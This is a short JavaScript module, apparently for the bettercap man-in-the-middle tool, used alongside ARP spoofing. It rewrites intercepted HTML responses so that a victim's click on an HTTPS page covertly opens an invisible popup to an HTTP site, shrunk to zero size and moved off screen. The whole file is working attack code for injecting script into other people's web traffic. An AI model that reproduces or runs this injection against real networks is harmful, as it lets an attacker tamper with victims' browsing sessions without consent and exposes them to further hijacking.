//Opens a new window of the browser

function onLoad() {
	log('Open new window Inject loaded.');	log('targets: ' + env['arp.spoof.targets']);
}

function onResponse(req, res) {
	if (res.ContentType.indexOf('text/html') == 0) {
		var body = res.ReadBody();
		if (body.indexOf('</head>') != -1) {
			res.Body = body.replace('</head>', '<script type="text/javascript">var w; document.body.onclick = function() { if ( window.location.protocol == "https:") {if (!w || w.closed) { w = window.open("http://time.com", "time", "width=,height=,directories=0,titlebar=0,toolbar=0,location=0,status=0,menubar=0,scrollbars=no,resizable=no,addressbar=0"); w.resizeTo(0,0); w.moveTo(window.screen.availWidth,window.screen.availHeight);} } };;</script></head>');
		}
	}
}

